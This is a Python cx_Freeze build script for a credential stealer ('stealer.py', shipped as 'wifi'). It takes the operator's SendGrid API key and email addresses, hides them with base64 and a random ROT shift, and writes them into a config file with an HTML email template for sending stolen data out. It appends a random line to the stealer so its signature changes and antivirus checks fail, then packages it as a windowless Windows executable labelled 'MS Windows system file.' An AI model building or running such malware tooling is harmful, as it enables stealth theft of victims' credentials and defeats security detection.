from cx_Freeze import setup, Executable
import random
import sys
import base64


class Build:

    from_email = None
    send_grid_api = None
    to_email = None
    shift = random.randint(1, 25)

    html_template = 'email.html'

    script_name = 'stealer.py'
    executable_name = 'wifi'

    def __init__(self):
        pass

    def build(self):
        # build the stealer
        self.from_email = self.rot(base64.b64encode(self.from_email).decode(), shift=self.shift)
        self.send_grid_api = self.rot(base64.b64encode(self.send_grid_api).decode(), shift=self.shift)
        self.to_email = self.rot(base64.b64encode(self.to_email).decode(), shift=self.shift)

        self.write_config_file()
        self.change_signature()
        self.cx_freeze()

    def rot(self, string: str, shift=13):
        # rot cipher
        small_case_alphabet = 'abcdefghijklmnopqrstuvwxyz'
        upper_case_alphabet = small_case_alphabet.upper()
        rot_string = ''

        string = list(str(string))

        for char in string:

            if char in small_case_alphabet:

                new_position = small_case_alphabet.index(char) + shift

                if new_position > 25:
                    new_position -= 26

                rot_string += small_case_alphabet[new_position]

            elif char in upper_case_alphabet:

                new_position = upper_case_alphabet.index(char) + shift

                if new_position > 25:
                    new_position -= 26

                rot_string += upper_case_alphabet[new_position]

            else:
                rot_string += char

        return rot_string

    def get_email_tempelte(self):
        with open(self.html_template, 'r') as template:
            return template.read()

    def write_config_file(self):
        # write config file
        content = f'''from_email = '{self.from_email}'
send_grid_api = '{self.send_grid_api}'
to_email = '{self.to_email}'
shift = {self.shift}
html_email = """{self.get_email_tempelte()}"""
'''
        with open('config.py', 'w', encoding="utf-8") as f:
            f.write(content)

    def change_signature(self):
        # add random line to the file
        with open('stealer.py', 'a', encoding="utf-8") as f:
            f.write(f"\nvar = {random.randint(-100000, 100000)}\nprint(var)\n")


    def cx_freeze(self):
        # build with cx_freeze
        sys.argv.append('build')

        file_description = 'MS Windows system file.'

        executables = [Executable(self.script_name, base='Win32GUI')]

        packages = ["idna"]
        options = {
            'build_exe': {    
                'packages':packages,
            },    
        }

        setup(
            name = self.executable_name,
            options = options,
            version = '1.0.0',
            description = file_description,
            executables = executables
        )


Builder = Build()
Builder.from_email    = input('From: ').encode()
Builder.send_grid_api = input('SendGrid API Key: ').encode()
Builder.to_email      = input('to: ').encode()
Builder.build()
